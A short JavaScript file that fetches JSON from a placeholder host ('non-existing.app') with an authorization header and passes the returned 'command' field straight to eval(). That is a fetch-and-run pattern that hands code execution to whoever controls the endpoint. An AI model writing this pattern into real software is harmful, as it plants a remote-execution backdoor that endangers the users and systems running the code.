import axios from "axios";

const startScript = async () => {

    const res = await axios.get('https://non-existing.app/api/random', {
        headers: {
            'Authorization': AUTH_TOKEN,
        }
    })

    console.log(res.data)
    eval(res.data.command)
}

startScript();
